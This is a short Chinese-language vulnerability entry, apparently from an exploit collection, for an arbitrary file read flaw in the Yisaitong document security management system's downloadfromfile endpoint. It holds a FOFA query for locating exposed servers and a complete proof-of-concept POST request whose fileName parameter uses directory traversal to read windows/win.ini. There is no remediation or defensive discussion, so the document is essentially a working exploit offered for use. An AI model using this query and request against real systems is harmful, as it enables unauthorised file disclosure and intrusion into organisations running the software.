## 亿赛通电子文档安全管理系统downloadfromfile存在任意文件读取漏洞

## fofa
```
body="/CDGServer3/index.jsp"
```
## poc
```
POST /CDGServer3/downloadfromfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

fileName=../../../../../../../../../../../windows/win.ini
```
